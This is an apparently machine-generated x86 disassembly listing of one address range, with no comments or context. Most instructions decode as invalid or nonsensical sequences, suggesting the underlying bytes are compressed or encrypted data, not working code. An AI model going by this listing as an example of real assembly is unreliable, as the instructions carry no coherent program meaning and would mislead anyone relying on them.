  4227bf:	or     al,0xf4
  4227c1:	(bad)  
  4227c2:	stc    
  4227c3:	mov    WORD PTR [ecx],gs
  4227c5:	inc    ebp
  4227c6:	retf   0x3e1c
  4227c9:	jg     0x422789
  4227cb:	shl    ebx,1
  4227cd:	test   eax,0x130453d1
  4227d2:	pop    ds
  4227d3:	test   al,0x32
  4227d5:	xchg   esp,eax
  4227d6:	and    ch,BYTE PTR [edi+0x7527ccf8]
  4227dc:	or     WORD PTR [ecx],si
  4227df:	jg     0x42280a
  4227e1:	in     eax,dx
  4227e2:	fs sub al,0x38
  4227e5:	sbb    eax,0x29453a81
  4227ea:	add    BYTE PTR [ebx+0x7f2d6de1],bl
  4227f0:	lods   eax,DWORD PTR ds:[esi]
  4227f1:	fcomi  st,st(7)
  4227f3:	sar    BYTE PTR [ebx],cl
  4227f5:	(bad)  
  4227f6:	add    ah,ch
  4227f8:	(bad)
  4227fc:	scas   eax,DWORD PTR es:[edi]
  4227fd:	add    DWORD PTR [eax],eax
  4227ff:	out    0x1,eax
  422801:	add    BYTE PTR [eax],al
  422803:	stos   DWORD PTR es:[edi],eax
  422804:	push   ebp
  422805:	xor    cl,BYTE PTR [edx]
  422807:	mov    dh,0x46
  422809:	js     0x4227c9
  42280b:	mov    cl,0xa0
  42280d:	xchg   ebx,eax
  42280e:	sub    al,0xf1
  422810:	dec    edx
  422811:	(bad)  
  422812:	jp     0x4227d8
  422814:	inc    eax
  422815:	imul   esp,DWORD PTR [eax-0x762419f8],0xe42bcb8f
  42281f:	mov    ebp,0x50628fab
  422824:	dec    ebx
  422825:	or     BYTE PTR [ecx-0x7e11a702],bh
  42282b:	xor    al,0x5a
  42282d:	and    al,0x30
  42282f:	push   es
  422830:	mov    WORD PTR [edi-0x6],fs
  422833:	push   0xb85362b2
  422838:	loopne 0x42284e
  42283a:	push   esi
  42283b:	cdq    
  42283c:	scas   eax,DWORD PTR es:[edi]
  42283d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42283e:	mov    ?,WORD PTR [ebp-0x5d2b52e5]
  422844:	and    DWORD PTR [edx-0x3727190],esi
  42284a:	rol    BYTE PTR [esi-0x57aff4a1],0x98
  422851:	xlat   BYTE PTR ds:[ebx]
  422852:	mov    esi,0xcba55483
  422857:	xchg   BYTE PTR [ebp-0x61],ah
  42285a:	fadd   st,st(6)
  42285c:	jecxz  0x42284c
  42285e:	dec    ebx
  42285f:	add    al,0x1b
  422861:	mov    ebx,0x57693119
  422866:	pop    ebp
  422867:	jge    0x4228b9
  422869:	sbb    ebp,esp
  42286b:	(bad)  
  42286c:	neg    bl
  42286e:	lahf   
  42286f:	aad    0xc
  422871:	je     0x4228b4
  422873:	jle    0x422856
  422875:	dec    eax
  422876:	idiv   BYTE PTR [ecx+0x33030613]
  42287c:	repz xchg bh,cl
  42287f:	lds    edx,FWORD PTR ds:0x19657bad
  422885:	cwde   
  422886:	push   eax
  422887:	shl    ah,cl
  422889:	sahf   
  42288a:	stc    
  42288b:	cs into 
  42288d:	(bad)  
  42288e:	cmp    ebx,edi
  422890:	sbb    ebp,DWORD PTR [ebp+eax*2-0x31]
  422894:	enter  0x504c,0x66
  422898:	inc    ebx
  422899:	push   ss
  42289a:	push   esi
  42289b:	push   cs
  42289c:	xor    BYTE PTR [esi+eax*2-0xc],cl
  4228a0:	mov    bl,0xa3
  4228a2:	cld    
  4228a3:	or     al,0xaf
  4228a5:	ds stc 
  4228a7:	lds    ecx,FWORD PTR [ebp-0x2bc78a45]
  4228ad:	loop   0x42291f
  4228af:	sahf   
  4228b0:	rcr    BYTE PTR [ebx+0xf178e42],cl
  4228b6:	inc    esp
  4228b7:	jle    0x422912
  4228b9:	test   eax,0x6619c65f
  4228be:	jge    0x42288c
  4228c0:	fld    TBYTE PTR [esi+0x1d8da7ff]
  4228c6:	dec    edx
  4228c7:	scas   al,BYTE PTR es:[edi]
  4228c8:	hlt    
  4228c9:	fldcw  WORD PTR [edi]
  4228cb:	mov    bh,0x48
  4228cd:	adc    BYTE PTR [esi],0xcd
  4228d0:	and    bl,BYTE PTR [eax+eiz*4+0x1bd75035]
  4228d7:	in     eax,dx
  4228d8:	add    eax,0xb4803511
  4228dd:	stc    
  4228de:	pop    ebp
  4228df:	(bad)  
  4228e0:	fistp  DWORD PTR [ebx-0x5d1f6584]
  4228e6:	jb     0x4228fb
  4228e8:	push   cs
  4228e9:	push   0xffffff81
  4228eb:	xchg   esp,eax
  4228ec:	and    BYTE PTR [edi+0x145a9755],dl
  4228f2:	popa   
  4228f3:	xor    al,0xab
  4228f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228f6:	jns    0x422954
  4228f8:	adc    eax,0x44f420aa
  4228fd:	lds    edx,FWORD PTR [esi]
  4228ff:	in     al,0x36
  422901:	push   edx
  422902:	retf   
  422903:	sub    eax,0xd445537c
  422908:	idiv   DWORD PTR [ebp+0x66]
  42290b:	dec    eax
  42290c:	cmp    eax,0x1ae74a3c
  422911:	daa    
  422912:	push   edi
  422913:	jmp    0x4228ba
  422915:	ret    0xe790
  422918:	and    ch,BYTE PTR [ecx-0x7e08658d]
  42291e:	clc    
  42291f:	push   esi
  422920:	inc    ebp
  422921:	pop    ebx
  422922:	add    dl,ah
  422924:	inc    ebx
  422925:	jecxz  0x42293a
  422927:	dec    ecx
  422928:	repz jnp 0x42298c
  42292b:	cmp    al,0x7f
  42292d:	iret   
  42292e:	popf   
  42292f:	(bad)
  422932:	aad    0xcf
  422934:	ja     0x422967
  422936:	add    DWORD PTR [esi],ebp
  422938:	or     BYTE PTR [eax-0x71f823a1],cl
  42293e:	icebp  
  42293f:	or     al,0xc9
  422941:	mov    ch,BYTE PTR [edi]
  422943:	add    eax,DWORD PTR [edx]
  422945:	(bad)  
  422947:	repz (bad) 
  422949:	fnstenv [ebp+0x4]
  42294c:	fldl2t 
  42294e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42294f:	push   cs
  422950:	cs daa 
  422952:	popa   
  422953:	ror    BYTE PTR [edx+0x19],cl
  422956:	icebp  
  422957:	mov    cl,0xa8
  422959:	adc    BYTE PTR [eax+edi*8-0x4565bd28],bh
  422960:	mov    esi,0xabb58840
  422965:	lods   al,BYTE PTR ds:[esi]
  422966:	dec    esi
  422967:	das    
  422968:	shl    BYTE PTR [ebx-0xe5c24ed],cl
  42296e:	es (bad) 
  422970:	xchg   ebx,eax
  422971:	dec    ecx
  422972:	sbb    DWORD PTR [edx],edx
  422974:	sub    eax,0xba713ebe
  422979:	and    DWORD PTR [edi],esp
  42297b:	mov    dl,BYTE PTR [edi+0x3e4cfd28]
  422981:	or     esp,DWORD PTR [ebp+0x32e9d09e]
  422987:	cld    
  422988:	dec    ecx
  422989:	jbe    0x422912
  42298b:	push   ebp
  42298c:	pop    edx
  42298d:	dec    edx
  42298e:	jmp    FWORD PTR [ebp-0x122998ef]
  422994:	xchg   bl,dl
  422996:	push   0xa545b9e9
  42299b:	xchg   edi,eax
  42299c:	inc    ecx
  42299d:	cld    
  42299e:	cdq    
  42299f:	xchg   ebp,eax
  4229a0:	leave  
  4229a1:	mov    al,0x15
  4229a3:	mov    esp,0x98c815fc
  4229a8:	mov    ah,0x70
  4229aa:	jne    0x422a1c
  4229ac:	cmp    edx,edx
  4229ae:	adc    eax,0x894e3a29
  4229b3:	xchg   BYTE PTR ds:0xb2899ce0,bh
  4229b9:	mul    DWORD PTR ds:0xd03a62a8
  4229bf:	imul   eax,DWORD PTR ds:0xdb7a012b,0x928c9015
  4229c9:	sbb    edx,ebp
  4229cb:	fstp   QWORD PTR [esi]
  4229cd:	add    eax,0x3c022e1b
  4229d2:	mov    cl,0x74
  4229d4:	push   edx
  4229d5:	add    BYTE PTR [edx+eax*8+0x9],bh
  4229d9:	fild   WORD PTR [ebx]
  4229db:	and    DWORD PTR [eax-0x4b],0xca1dc932
  4229e2:	add    BYTE PTR [edi-0x11fe709e],dl
  4229e8:	mov    ch,0x4f
  4229ea:	add    BYTE PTR [eax],cl
  4229ec:	div    DWORD PTR [edi+0x4a]
  4229ef:	dec    edx
  4229f1:	cmp    eax,0x2e8eedf7
  4229f6:	dec    eax
  4229f7:	mov    eax,0x706025a7
  4229fc:	mov    cl,0x1
  4229fe:	add    bh,ah
  422a00:	add    DWORD PTR [eax],eax
  422a02:	add    ch,dh
  422a04:	sub    bh,BYTE PTR [ebp+ebp*1+0x53]
  422a08:	dec    eax
  422a09:	fstp   QWORD PTR [ecx-0x29ee57b8]
  422a0f:	push   esp
  422a10:	xor    DWORD PTR [ecx-0x78],edi
  422a13:	(bad)  
  422a14:	jmp    0x3d7cfd67
  422a19:	inc    edi
  422a1a:	ins    DWORD PTR es:[di],dx
  422a1c:	pop    ds
  422a1d:	call   0x2cff35ca
  422a22:	data16 mov BYTE PTR [ebp-0x4d],0xb5
  422a27:	fimul  DWORD PTR [ecx+edx*1]
  422a2a:	xor    BYTE PTR [esp+ebx*8-0x5e8cfd65],dh
  422a31:	imul   esp,DWORD PTR ds:0x5825feea,0x13ffa549
  422a3b:	(bad)  
  422a3c:	cli    
  422a3d:	scas   al,BYTE PTR es:[edi]
  422a3e:	sbb    esp,DWORD PTR [ebx-0x3b]
  422a41:	dec    ebx
  422a42:	arpl   WORD PTR [ecx],bp
  422a44:	xor    eax,0xdeb14759
  422a49:	lods   al,BYTE PTR ds:[esi]
  422a4a:	jl     0x422a79
  422a4c:	pop    edx
  422a4d:	mov    DWORD PTR [ebx*8+0x308b75a],eax
  422a54:	dec    edi
  422a55:	js     0x422ac9
  422a57:	jbe    0x422a55
  422a59:	or     dh,BYTE PTR [esi-0x4d]
  422a5c:	or     edx,DWORD PTR [ecx+0x41d9f0cc]
  422a62:	add    bl,bh
  422a64:	in     al,0x58
  422a66:	pop    esp
  422a67:	lea    edx,[edx+eax*4-0x35]
  422a6b:	mov    ds:0x861d461a,al
  422a70:	push   ss
  422a71:	pop    eax
  422a72:	and    eax,0x52a92645
  422a77:	xor    DWORD PTR [edx-0x533f42c3],0x6a
  422a7e:	loopne 0x422a88
  422a80:	(bad)  
  422a81:	mov    WORD PTR [edi+edx*2-0x29a23c1c],ds
  422a88:	ins    DWORD PTR es:[edi],dx
  422a89:	pop    ebp
  422a8a:	xchg   ebx,eax
  422a8b:	test   DWORD PTR [edx+0x2529c7bd],edx
  422a91:	out    0xd5,al
  422a93:	out    0xc5,al
  422a95:	sbb    al,0x90
  422a97:	(bad)  
  422a99:	pop    edx
  422a9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a9b:	sub    DWORD PTR [esi+0x14],ebx
  422a9e:	cmc    
  422a9f:	adc    BYTE PTR [edi],dh
  422aa1:	jmp    0x37d12c2f
  422aa6:	das    
  422aa7:	inc    esp
  422aa8:	lods   al,BYTE PTR ds:[esi]
  422aa9:	push   cs
  422aaa:	loope  0x422a79
  422aac:	pop    ebx
  422aad:	sahf   
  422aae:	xor    al,BYTE PTR [ecx]
  422ab0:	dec    ebx
  422ab1:	adc    BYTE PTR [edx],bl
  422ab3:	iret   
  422ab4:	in     eax,0x8f
  422ab6:	xchg   ch,ch
  422ab8:	loopne 0x422a83
  422aba:	mov    ds:0x1df8f330,eax
  422abf:	push   esp
  422ac0:	iret   
  422ac1:	or     DWORD PTR [ecx+0x3f],edx
  422ac4:	mov    bh,0xbc
  422ac6:	inc    ebp
  422ac7:	cli    
  422ac8:	leave  
  422ac9:	mov    ds:0x77f7e194,eax
  422ace:	inc    ecx
  422acf:	cmp    al,BYTE PTR [esi+eiz*2+0x1]
  422ad3:	pop    ecx
  422ad4:	xchg   esp,eax
  422ad5:	push   es
  422ad6:	(bad)  
  422ad7:	clc    
  422ad8:	mov    bl,0x5
  422ada:	sub    ch,bl
  422adc:	sub    al,0x98
  422adf:	in     al,dx
  422ae0:	cmp    eax,0xfdff257a
  422ae5:	(bad)  [ecx+0x20]
  422ae8:	jno    0x422ab4
  422aea:	bound  ecx,QWORD PTR ds:0x7086c123
  422af0:	shl    DWORD PTR [ebx+0x79186cd3],cl
  422af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422af7:	cmp    eax,0x1d54dfe2
  422afc:	pop    ss
  422afd:	xchg   esi,eax
  422afe:	test   eax,0x18b95961
  422b03:	icebp  
  422b04:	mov    ebp,0xc5ad4011
  422b09:	mov    ecx,0x435ac1e2
  422b0e:	sbb    bl,BYTE PTR [ebp-0x3e]
  422b11:	dec    ecx
  422b12:	mov    bl,0x36
  422b14:	jmp    0xbb799a25
  422b19:	ins    BYTE PTR es:[edi],dx
  422b1a:	jno    0x422ac0
  422b1c:	(bad)  
  422b1d:	jmp    0x26993447
  422b22:	adc    edx,DWORD PTR [edx-0x4c8d7449]
  422b28:	dec    esi
  422b29:	and    eax,0x13f79f32
  422b2e:	pop    ecx
  422b2f:	mov    ebx,?
  422b31:	pop    ebx
  422b32:	cmp    edx,edi
  422b34:	cdq    
  422b35:	(bad)  
  422b36:	enter  0x7ab2,0xc5
  422b3a:	jnp    0x422b3d
  422b3c:	xor    ebp,0x7e
  422b3f:	mov    bh,BYTE PTR [ebx+ecx*1+0x47]
  422b43:	mov    ah,0x5f
  422b45:	sti    
  422b46:	mov    eax,0xf88d1652
  422b4b:	pop    ebp
  422b4c:	and    al,0xdd
  422b4e:	push   es
  422b4f:	lods   eax,DWORD PTR ds:[esi]
  422b50:	aad    0xa2
  422b52:	cmp    DWORD PTR [edi+0x7f],edx
  422b55:	sbb    ch,ch
  422b57:	fwait
  422b58:	jecxz  0x422b14
  422b5a:	and    eax,0xf339c05d
  422b5f:	pop    ss
  422b60:	adc    DWORD PTR [edi+ebx*2+0x1b26b144],0x1
  422b68:	not    DWORD PTR [ecx]
  422b6a:	or     dl,al
  422b6c:	inc    esi
  422b6d:	add    ch,0x5a
  422b70:	out    dx,eax
  422b71:	outs   dx,BYTE PTR ds:[esi]
  422b72:	mov    esp,0x6d07142c
  422b77:	pop    ebx
  422b78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b79:	enter  0xc19c,0xd7
  422b7d:	xlat   BYTE PTR ds:[ebx]
  422b7e:	push   ss
  422b7f:	push   ebp
  422b80:	(bad)  
  422b81:	mul    DWORD PTR [eax+edx*2-0x497f26fd]
  422b88:	mov    ?,WORD PTR [ecx+ebx*2+0x7ae07df5]
  422b8f:	mov    gs,WORD PTR [ebx+0x27]
  422b92:	outs   dx,BYTE PTR ds:[esi]
  422b93:	js     0x422b4d
  422b95:	xor    ebp,DWORD PTR [ebx-0x19cd1508]
  422b9b:	(bad)  
  422b9d:	fidiv  DWORD PTR [esi+ebp*1]
  422ba0:	pop    ecx
  422ba1:	iret   
  422ba2:	call   0x12b5:0x4bc46a40
  422ba9:	std    
  422baa:	dec    esi
  422bab:	pop    ss
  422bac:	inc    esi
  422bad:	xchg   ebx,eax
  422bae:	adc    DWORD PTR [edi],esp
  422bb0:	out    dx,al
  422bb1:	jne    0x422b82
  422bb3:	sbb    dl,bl
  422bb5:	sbb    al,0x79
  422bb7:	in     eax,dx
  422bb8:	xor    eax,ebp
  422bba:	and    DWORD PTR [ebx+0x72288256],edx
  422bc0:	stos   BYTE PTR es:[edi],al
  422bc1:	or     edx,eax
  422bc3:	aad    0xb4
  422bc5:	add    bl,BYTE PTR [esi+0x5ad924c9]
  422bcb:	mov    dl,0x18
  422bcd:	cmp    ah,ch
  422bcf:	loope  0x422c0d
  422bd1:	dec    eax
  422bd2:	inc    esi
  422bd3:	fwait
  422bd4:	mov    edi,0x6e2daaa3
  422bd9:	jge    0x422be2
  422bdb:	(bad)  
  422bdd:	neg    DWORD PTR [eax]
  422bdf:	or     ebx,DWORD PTR ds:0x1a548de6
  422be5:	pop    edx
  422be6:	jno    0x422c3f
  422be8:	add    eax,0x6336004e
  422bed:	push   0xbefb7df0
  422bf2:	out    0x53,eax
  422bf4:	js     0x422b82
  422bf6:	daa    
  422bf7:	jo     0x422c51
  422bf9:	cwde   
  422bfa:	xor    DWORD PTR [edi-0x4d],edx
  422bfd:	add    DWORD PTR [eax],eax
  422bff:	out    0x1,eax
  422c01:	add    BYTE PTR [eax],al
  422c03:	or     eax,0xf0998eda
  422c08:	lock mov esp,0xcc3b0561
  422c0e:	mov    dl,0x41
  422c10:	add    BYTE PTR [edx-0x18],cl
  422c13:	dec    eax
  422c14:	repz adc BYTE PTR [esi],ch
  422c17:	add    bl,al
  422c19:	fcmovnu st,st(5)
  422c1b:	inc    edx
  422c1c:	dec    edi
  422c1d:	(bad)  
  422c1f:	sar    BYTE PTR [eax+0xe039fd8],0x7d
  422c26:	push   es
  422c27:	int3   
  422c28:	rcl    DWORD PTR [eax],0xdf
  422c2b:	xchg   al,bh
  422c2d:	test   BYTE PTR [edx-0x3eb84082],al
  422c33:	dec    esi
  422c34:	xlat   BYTE PTR ds:[ebx]
  422c35:	push   ebp
  422c36:	pop    edx
  422c37:	push   edx
  422c38:	dec    ecx
  422c39:	(bad)  
  422c3a:	pop    esi
  422c3b:	retf   
  422c3c:	push   0x5da47b9a
  422c41:	(bad)  
  422c42:	xor    ebp,DWORD PTR [edi+0x26]
  422c45:	(bad)  
  422c47:	cmp    dh,ch
  422c49:	inc    ebx
  422c4a:	sub    al,0x3c
  422c4c:	add    BYTE PTR [ebp+eax*1-0x77cf2a68],al
  422c53:	call   0xd0b2dd86
  422c58:	mov    eax,ds:0x8e7ca735
  422c5d:	push   esi
  422c5e:	mov    al,ds:0x1d460c5
  422c63:	inc    esp
  422c64:	out    dx,eax
  422c65:	and    eax,0xf95b3410
  422c6a:	jecxz  0x422cd5
  422c6c:	xor    esp,eax
  422c6e:	es mov eax,0xeb033a48
  422c74:	add    eax,0xc34ec3c3
  422c79:	jae    0x422ce4
  422c7b:	xor    al,BYTE PTR [edi+0x4d]
  422c7e:	sbb    DWORD PTR [eax],0xa4d6ed6f
  422c84:	jge    0x422cde
  422c86:	ret    0xda64
  422c89:	and    DWORD PTR [ebp+0x24],edi
  422c8c:	mov    ecx,0x42707333
  422c91:	or     edx,DWORD PTR [ecx+0x1ab2bc39]
  422c97:	jb     0x422c57
  422c99:	test   BYTE PTR [edi],bh
  422c9b:	mov    cl,0x4
  422c9d:	jnp    0x422c95
  422c9f:	nop
  422ca0:	mov    ch,0xf6
  422ca2:	(bad)  
  422ca3:	call   0xeec79e8d
  422ca8:	cs (bad) 
  422caa:	cmp    al,0xc6
  422cac:	sbb    edx,esi
  422cae:	sbb    bh,0x3c
  422cb1:	leave  
  422cb2:	inc    ebx
  422cb3:	stc    
  422cb4:	(bad)  
  422cb5:	std    
  422cb6:	outs   dx,DWORD PTR ds:[esi]
  422cb7:	fsubp  st(4),st
  422cb9:	leave  
  422cba:	leave  
  422cbb:	clc    
  422cbc:	imul   ebp,DWORD PTR [esp+edi*2-0x60],0xc87a33bb
  422cc4:	xchg   esp,eax
  422cc5:	cmp    bl,BYTE PTR [edi+0x69e00ea]
  422ccb:	(bad)  
  422ccc:	add    DWORD PTR [ebp-0x36],edi
  422ccf:	repnz sbb edi,DWORD PTR [ecx]
  422cd2:	std    
  422cd3:	pop    ebp
  422cd4:	fadd   DWORD PTR [edx]
  422cd6:	popf   
  422cd7:	xor    ah,bh
  422cd9:	scas   eax,DWORD PTR es:[edi]
  422cda:	cmp    ch,al
  422cdc:	mov    ebp,DWORD PTR [ecx+0x522a4173]
  422ce2:	leave  
  422ce3:	add    esi,DWORD PTR es:[ecx+edx*8+0x3]
  422ce8:	sbb    al,0x27
  422cea:	mov    ds:0xc3de8846,eax
  422cef:	adc    eax,0x6cdeb0a3
  422cf4:	stos   BYTE PTR es:[edi],al
  422cf5:	xor    DWORD PTR ds:0xed0018a1,esi
  422cfb:	pop    edi
  422cfc:	mov    esp,0xe8ee5f11
  422d01:	adc    cl,BYTE PTR [edi+0x55]
  422d04:	mov    edi,0xc295c98a
  422d09:	clc    
  422d0a:	sub    al,0x5a
  422d0c:	add    BYTE PTR [ebx],ch
  422d0e:	ins    BYTE PTR es:[edi],dx
  422d0f:	push   ebp
  422d10:	test   DWORD PTR [eax+0x45],ecx
  422d13:	pop    ebx
  422d14:	jmp    0x466:0xf52bab1e
  422d1b:	repnz pop ss
  422d1d:	adc    bh,BYTE PTR [edx-0x432bba2]
  422d23:	out    dx,al
  422d24:	ja     0x422cd2
  422d26:	das    
  422d27:	pop    edi
  422d28:	cdq    
  422d29:	push   ecx
  422d2a:	adc    bh,BYTE PTR [esi+0x7a]
  422d2d:	test   DWORD PTR [edx+0x4b],edi
  422d30:	into   
  422d31:	lock xchg esp,eax
  422d33:	ror    dl,0xcc
  422d36:	cld    
  422d37:	ins    DWORD PTR es:[edi],dx
  422d38:	pop    eax
  422d39:	jnp    0x422cd4
  422d3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d3c:	mov    bh,0x49
  422d3e:	mov    edi,0x55eae3bc
  422d43:	cs scas eax,DWORD PTR es:[edi]
  422d45:	test   eax,0x3b365517
  422d4a:	jge    0x422dab
  422d4c:	inc    esi
  422d4d:	into   
  422d4e:	dec    esi
  422d4f:	pusha  
  422d50:	call   0x357ffa77
  422d55:	(bad)  
  422d57:	dec    eax
  422d58:	inc    ecx
  422d59:	sub    ah,BYTE PTR [esi]
  422d5b:	scas   al,BYTE PTR es:[edi]
  422d5c:	lock and al,0x9e
  422d5f:	aas    
  422d60:	int    0xa2
  422d62:	dec    ebx
  422d63:	outs   dx,DWORD PTR ds:[esi]
  422d64:	and    bl,BYTE PTR [ebp-0x4d67d839]
  422d6a:	aas    
  422d6b:	shl    DWORD PTR [esi+0x133b6e61],cl
  422d71:	xor    ebx,DWORD PTR [edx-0x47]
  422d74:	mov    edx,0x52d1118c
  422d79:	jg     0x422d4a
  422d7b:	loop   0x422db7
  422d7d:	cmc    
  422d7e:	jmp    0x422d9c
  422d80:	retf   
  422d81:	icebp  
  422d82:	call   FWORD PTR [ebx-0x3c]
  422d85:	xchg   esi,eax
  422d86:	in     al,dx
  422d87:	lods   eax,DWORD PTR ds:[esi]
  422d88:	push   ebp
  422d89:	int    0x3d
  422d8b:	std    
  422d8c:	cwde   
  422d8d:	push   ebp
  422d8e:	jae    0x422d36
  422d90:	ret    
  422d91:	mov    cl,BYTE PTR [eax-0x37f09f52]
  422d97:	pop    esp
  422d98:	adc    BYTE PTR [ecx+0x24c049a7],0xd8
  422d9f:	fidivr WORD PTR [edi-0x67f7bfaa]
  422da5:	mov    bl,0xcc
  422da7:	pop    ebp
  422da8:	jbe    0x422d8b
  422daa:	dec    esp
  422dab:	ins    BYTE PTR es:[edi],dx
  422dac:	jmp    0x73ba:0x731a4180
  422db3:	xchg   ecx,eax
  422db4:	mov    bh,0x86
  422db6:	test   esp,esi
  422db8:	dec    edi
  422db9:	test   bl,bl
  422dbb:	sub    bh,cl
  422dbd:	adc    eax,0x97a39146
  422dc2:	mov    ecx,0x404619ca
  422dc7:	(bad)  [edx-0x20]
  422dca:	ja     0x422e40
  422dcc:	test   DWORD PTR [ebx-0x3998858e],0x35c2d15b
  422dd6:	adc    eax,0x8bee7913
  422ddb:	(bad)  
  422ddc:	sub    ebp,ebx
  422dde:	sbb    BYTE PTR [eax+0x2baf37a9],0x56
  422de5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422de6:	jp     0x422dc7
  422de8:	arpl   WORD PTR [bx+si],ax
  422deb:	daa    
  422dec:	push   ecx
  422ded:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  422df7:	and    BYTE PTR [esi-0x2883fc0c],bl
  422dfd:	add    DWORD PTR [eax],eax
  422dff:	out    0x1,eax
  422e01:	add    BYTE PTR [eax],al
  422e03:	push   cs
  422e04:	in     eax,0x43
  422e06:	lea    ebx,[ebx-0x6f]
  422e09:	fisubr WORD PTR [esp+eax*8-0x58ecb0e1]
  422e10:	repnz pusha 
  422e12:	addr16 jg 0x422de0
  422e15:	push   es
  422e16:	ffree  st(2)
  422e18:	adc    bh,BYTE PTR [ebp-0x14]
  422e1b:	daa    
  422e1c:	xchg   DWORD PTR ds:0x383ed2a,eax
  422e22:	inc    esp
  422e23:	imul   eax,DWORD PTR [edx-0x13],0x6a
  422e27:	popf   
  422e28:	stos   DWORD PTR es:[edi],eax
  422e29:	or     ecx,0x228714d6
  422e2f:	mov    ecx,0x7eab31c9
  422e34:	cmp    ebx,ebx
  422e36:	push   edi
  422e37:	pop    eax
  422e38:	cmp    eax,0x6819aa98
  422e3d:	arpl   ax,ax
  422e3f:	pop    edi
  422e40:	(bad)  
  422e42:	int    0x5
  422e44:	mov    ds:0x72c841c1,eax
  422e49:	jge    0x422dfa
  422e4b:	pop    ss
  422e4c:	jae    0x422e55
  422e4e:	sahf   
  422e4f:	nop
  422e50:	jl     0x422dd7
  422e52:	fdivr  QWORD PTR [edi+0x3d]
  422e55:	daa    
  422e56:	in     eax,0x8e
  422e58:	xchg   esp,eax
  422e59:	stc    
  422e5a:	mov    edx,0xd9c08fb6
  422e5f:	stc    
  422e60:	shr    BYTE PTR [edi],0xfa
  422e63:	loop   0x422e39
  422e65:	in     eax,0xad
  422e67:	lods   eax,DWORD PTR ds:[esi]
  422e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e69:	ins    DWORD PTR es:[edi],dx
  422e6a:	test   eax,0x154c7c56
  422e6f:	sbb    DWORD PTR [ecx],0x816b71a3
  422e75:	xor    al,BYTE PTR [edx-0x7b]
  422e78:	out    dx,al
  422e79:	cmp    ebp,DWORD PTR [edx+0xf]
  422e7c:	fs pop esp
  422e7e:	mov    al,0x4f
  422e80:	sbb    DWORD PTR [esi+edx*4-0x4],ecx
  422e84:	cmc    
  422e85:	shr    DWORD PTR [edi],1
  422e87:	ret    0x1798
  422e8a:	xor    al,0x40
  422e8c:	inc    ebp
  422e8d:	add    cl,ch
  422e8f:	sub    DWORD PTR [eax+0xb],eax
  422e92:	lds    ebx,FWORD PTR [esi-0x14b523c8]
  422e98:	and    al,0x42
  422e9a:	test   BYTE PTR [ebx+0x6a],ah
  422e9d:	sti    
  422e9e:	outs   dx,BYTE PTR ds:[esi]
  422e9f:	psrad  mm6,QWORD PTR [eax]
  422ea2:	out    dx,eax
  422ea3:	dec    esi
  422ea4:	and    ebp,DWORD PTR [edi-0x7e]
  422ea7:	pop    edx
  422ea8:	jnp    0x422eed
  422eaa:	loopne 0x422f12
  422eac:	sub    eax,DWORD PTR [edi-0x1043ac12]
  422eb2:	and    eax,0x53e2353e
  422eb7:	aas    
  422eb8:	outs   dx,BYTE PTR ds:[esi]
  422eb9:	aaa    
  422eba:	fs daa 
  422ebc:	jg     0x422e5e
  422ebe:	sbb    ebx,DWORD PTR [ebp+0x6bc84a1d]
  422ec4:	jae    0x422eb4
  422ec6:	fcmovnb st,st(2)
  422ec8:	and    al,0xd0
  422eca:	ja     0x422ed6
  422ecc:	cmp    eax,0x156ed2b
  422ed1:	and    eax,0xc785fd20
  422ed6:	imul   esi,DWORD PTR [edx],0x9108daae
  422edc:	add    DWORD PTR [edi+0x7f],eax
  422edf:	mov    ecx,0xca523a07
  422ee4:	imul   ebx,ecx,0x10
  422ee7:	sub    dl,dl
  422ee9:	icebp  
  422eea:	cdq    
  422eeb:	adc    BYTE PTR [ebx],cl
  422eed:	mov    ds:0x2863d59,al
  422ef2:	sbb    al,0x83
  422ef4:	xlat   BYTE PTR ds:[ebx]
  422ef5:	push   edx
  422ef6:	and    DWORD PTR [esi-0x7a],esp
  422ef9:	std    
  422efa:	popf   
  422efb:	(bad)  
  422efc:	xchg   ecx,eax
  422efd:	(bad)  
  422eff:	jp     0x422f73
  422f01:	outs   dx,BYTE PTR ds:[esi]
  422f02:	jb     0x422eac
  422f04:	dec    ecx
  422f05:	mov    ds:0x9918545a,al
  422f0a:	xchg   ebp,eax
  422f0b:	not    DWORD PTR [edi]
  422f0d:	xchg   esi,eax
  422f0e:	inc    edi
  422f0f:	dec    ebp
  422f10:	leave  
  422f11:	mov    edx,0x695ab21
  422f16:	dec    eax
  422f17:	push   0x164667ef
  422f1c:	int    0x1d
  422f1e:	push   edx
  422f1f:	shl    edx,1
  422f21:	pop    ds
  422f22:	rol    BYTE PTR [edi-0x66],0x69
  422f26:	test   al,0x1a
  422f28:	mov    gs,WORD PTR [eax]
  422f2a:	imul   ebp,DWORD PTR [ebp+edx*4-0x4a],0xe7fa0676
  422f32:	(bad)  
  422f33:	push   ebp
  422f34:	mov    ecx,0xd0f029b0
  422f39:	cli    
  422f3a:	inc    esp
  422f3b:	mov    WORD PTR [ebx+0x391e21f5],ds
  422f41:	aad    0x25
  422f43:	push   esi
  422f44:	inc    esp
  422f45:	or     eax,0xcff72029
  422f4a:	call   FWORD PTR [eax+0x77cd81c8]
  422f50:	addr16 pusha 
  422f52:	aas    
  422f53:	in     al,0x55
  422f55:	xor    edi,DWORD PTR [ecx+0x5]
  422f58:	cs clc 
  422f5a:	aam    0x1f
  422f5c:	cmc    
  422f5d:	repz dec edx
  422f5f:	ss sahf 
  422f61:	xchg   ecx,eax
  422f62:	inc    edx
  422f63:	sub    esi,DWORD PTR [ecx-0x73b6e435]
  422f69:	pop    es
  422f6a:	cmc    
  422f6b:	call   0x281b:0x474c16c9
  422f72:	(bad)
  422f76:	jno    0x422fb4
  422f78:	icebp  
  422f79:	loopne 0x422fab
  422f7b:	push   es
  422f7c:	jle    0x422f9c
  422f7e:	in     eax,dx
  422f7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f80:	(bad)  
  422f81:	bound  ebp,QWORD PTR [ebx-0x4]
  422f84:	push   ecx
  422f85:	mov    edi,0x6a98c803
  422f8a:	dec    eax
